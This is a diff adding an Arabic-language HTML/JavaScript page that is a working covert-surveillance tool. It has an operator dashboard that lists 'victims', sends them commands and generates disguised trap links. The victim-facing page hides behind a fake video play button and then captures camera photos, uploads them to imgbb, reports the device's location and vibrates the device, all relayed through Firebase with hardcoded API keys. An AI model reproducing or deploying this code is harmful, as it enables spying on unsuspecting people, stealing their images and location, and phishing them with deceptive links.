@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>H-SYSTEM V35 | ELITE CONTROL</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --neon: #00ff41; --bg: #000; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        
+        /* لوحة التحكم */
+        #dashboard { padding: 15px; }
+        .box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 20px; background: rgba(0, 255, 65, 0.02); border-radius: 5px; }
+        .target-item { border: 1px solid #333; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #080808; }
+        .target-item.active { border-color: #fff; box-shadow: 0 0 10px var(--neon); }
+        
+        .controls-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        button:active { background: var(--neon); color: #000; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: #fff; margin-bottom: 10px; box-sizing: border-box; }
+
+        /* واجهة الضحية */
+        #victim-overlay { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
+        .play-btn { width: 120px; height: 120px; border: 5px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play-btn::after { content: ''; position: absolute; top: 30px; left: 45px; border-left: 40px solid #fff; border-top: 30px solid transparent; border-bottom: 30px solid transparent; }
+    </style>
+</head>
+<body>
+
+<div id="dashboard">
+    <div class="box">
+        <h2 style="margin:0;">📡 رادار الاختراق (hkrs4000)</h2>
+        <p style="font-size: 10px;">الحالة: <span id="db-status">جاري الاتصال...</span></p>
+        <div id="target-list">بانتظار نبض الأجهزة...</div>
+    </div>
+
+    <div class="box">
+        <h3>🕹️ التحكم بالجهاز: <span id="active-device" style="color:#fff;">--</span></h3>
+        <div class="controls-grid">
+            <button onclick="trigger('snap')">📸 سحب صورة (كاميرا)</button>
+            <button onclick="trigger('vibrate')">📳 اهتزاز الجهاز</button>
+            <button onclick="trigger('loc')">📍 تحديد الموقع</button>
+            <button onclick="trigger('release')" style="color:red;">🔓 إغلاق الجلسة</button>
+        </div>
+        <button onclick="db.ref('sessions').remove()" style="margin-top:15px; width:100%; color:red; border-color:red; font-size:10px;">🗑️ مسح كافة الجلسات</button>
+    </div>
+
+    <div class="box">
+        <h3>🖼️ مصنع الروابط والملغمات</h3>
+        <input type="text" id="decoy-link" placeholder="رابط فيديو يوتيوب أو صورة للتمويه">
+        <button onclick="generateTrap()">توليد الرابط الملغم</button>
+        <div id="trap-result" style="font-size:10px; color:cyan; margin-top:10px; word-break:break-all; background:#111; padding:10px;"></div>
+    </div>
+</div>
+
+<div id="victim-overlay">
+    <div class="play-btn" onclick="ignite()"></div>
+    <p style="color:#fff; margin-top:20px;">انقر للمشاهدة | Tap to View</p>
+    <video id="v-feed" autoplay playsinline style="display:none;"></video>
+    <canvas id="v-canvas" style="display:none;"></canvas>
+</div>
+
+<script>
+    // --- التكوين بمفاتيحك الجديدة ---
+    const IMGBB_API = "399bf85325feb7de4a2300c744a7e7e2";
+    const firebaseConfig = {
+        apiKey: "AIzaSyCszTVJWZY1B0wKB0P5rFLVlZHc1usgA7c",
+        authDomain: "hkrs4000.firebaseapp.com",
+        databaseURL: "https://hkrs4000-default-rtdb.firebaseio.com", // رابط القاعدة بناءً على الـ ID
+        projectId: "hkrs4000"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let selectedSession = null;
+
+    // فحص الاتصال
+    db.ref('.info/connected').on('value', s => {
+        document.getElementById('db-status').innerText = s.val() ? "متصل بالقاعدة" : "خطأ في الاتصال";
+    });
+
+    const params = new URLSearchParams(window.location.search);
+    const victimKey = params.get('v');
+
+    if (victimKey) {
+        document.getElementById('dashboard').style.display = 'none';
+        document.getElementById('victim-overlay').style.display = 'flex';
+        startConnection(atob(victimKey));
+    } else {
+        loadAdmin();
+    }
+
+    // --- وظائف الآدمن ---
+    function loadAdmin() {
+        db.ref('sessions').on('value', s => {
+            const list = document.getElementById('target-list');
+            list.innerHTML = '';
+            if(!s.exists()) { list.innerHTML = "لا توجد جلسات نشطة حالياً."; return; }
+            s.forEach(child => {
+                const data = child.val();
+                const id = child.key;
+                const online = (Date.now() - data.lastPulse) < 10000;
+                list.innerHTML += `<div class="target-item ${id === selectedSession ? 'active' : ''}" onclick="selectDev('${id}','${data.model}')">
+                    <span>📱 ${data.model}</span>
+                    <span style="color:${online ? '#0f0' : '#444'}">${online ? 'متصل' : 'غائب'}</span>
+                </div>`;
+            });
+        });
+    }
+
+    function selectDev(id, name) { selectedSession = id; document.getElementById('active-device').innerText = name; loadAdmin(); }
+    function trigger(t) { if(selectedSession) db.ref('sessions/'+selectedSession+'/cmd').set({ t, time: Date.now() }); }
+    function generateTrap() {
+        const u = document.getElementById('decoy-link').value;
+        if(!u) return alert("أدخل رابطاً!");
+        document.getElementById('trap-result').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
+    }
+
+    // --- وظائف الضحية (الاتصال العكسي) ---
+    let myRef = null;
+    function startConnection(target) {
+        const info = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "Device";
+        myRef = db.ref('sessions').push();
+        
+        const pulse = () => myRef.update({ model: info, lastPulse: Date.now() });
+        pulse(); setInterval(pulse, 4000);
+
+        db.ref('sessions/' + myRef.key + '/cmd').on('value', s => {
+            const c = s.val(); if(!c) return;
+            if(c.t === 'snap') capture();
+            if(c.t === 'vibrate') navigator.vibrate([500, 200, 500]);
+            if(c.t === 'loc') navigator.geolocation.getCurrentPosition(p => {
+                myRef.child('location').set(`https://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+            if(c.t === 'release') window.location.href = target;
+        });
+    }
+
+    async function ignite() { await capture(); }
+
+    async function capture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            const v = document.getElementById('v-feed'); v.srcObject = stream; await v.play();
+            const c = document.getElementById('v-canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const raw = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+            
+            let fd = new FormData(); fd.append("image", raw);
+            fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API}`, {method:"POST", body:fd})
+            .then(res => res.json()).then(res => { myRef.child('photos').push(res.data.url); });
+            
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+</script>
+</body>
+</html>
